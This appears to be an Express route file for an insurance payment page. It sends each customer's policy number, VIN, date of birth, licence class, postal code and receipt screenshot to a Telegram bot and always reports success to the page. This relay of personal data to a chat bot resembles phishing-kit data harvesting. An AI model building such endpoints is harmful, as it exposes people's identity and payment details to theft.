import { Router } from 'express';
import { z } from 'zod';
import { validate } from '../middleware/validate.js';

const router = Router();

const notifySchema = z.object({
  // Customer details
  policy_number:  z.string(),
  amount:         z.number(),
  coverage_type:  z.string(),
  term:           z.string(),
  deductible:     z.string(),
  // Vehicle
  vin:            z.string(),
  vehicle:        z.string(),
  // Driver
  license_class:  z.string(),
  dob:            z.string(),
  postal:         z.string(),
  // Screenshot as base64
  receipt_base64: z.string(),        // "data:image/png;base64,..."
  receipt_name:   z.string(),
});

// ─── POST /api/notify/payment  (public — called by the frontend) ──
router.post('/payment', validate(notifySchema), async (req, res, next) => {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId   = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      // Telegram not configured — acknowledge anyway so the UX doesn't break
      res.json({ ok: true, telegram: false });
      return;
    }

    const d = req.body as z.infer<typeof notifySchema>;

    // ── Build message caption ──────────────────────────────────
    const caption = [
      `📋 *New Payment Submission*`,
      ``,
      `*Policy:* \`${d.policy_number}\``,
      `*Amount:* $${d.amount} CAD`,
      `*Coverage:* ${d.coverage_type} — ${d.term}`,
      `*Deductible:* $${d.deductible}`,
      ``,
      `*Vehicle:* ${d.vehicle}`,
      `*VIN:* \`${d.vin}\``,
      ``,
      `*License:* ${d.license_class}`,
      `*DOB:* ${d.dob}`,
      `*Postal:* ${d.postal}`,
    ].join('\n');

    // ── Convert base64 to Buffer ───────────────────────────────
    const base64Data = d.receipt_base64.replace(/^data:[^;]+;base64,/, '');
    const imageBuffer = Buffer.from(base64Data, 'base64');

    // ── Send photo via Telegram Bot API ───────────────────────
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('caption', caption);
    form.append('parse_mode', 'Markdown');
    form.append(
      'photo',
      new Blob([imageBuffer], { type: 'image/jpeg' }),
      d.receipt_name || 'receipt.jpg',
    );

    const tgRes = await fetch(
      `https://api.telegram.org/bot${botToken}/sendPhoto`,
      { method: 'POST', body: form },
    );

    const tgBody = await tgRes.json() as { ok: boolean; description?: string };

    if (!tgBody.ok) {
      console.error('[telegram] sendPhoto failed:', tgBody.description);
      // Still return 200 to the client — don't block the UX
    }

    res.json({ ok: true, telegram: tgBody.ok });
  } catch (err) {
    next(err);
  }
});

export default router;
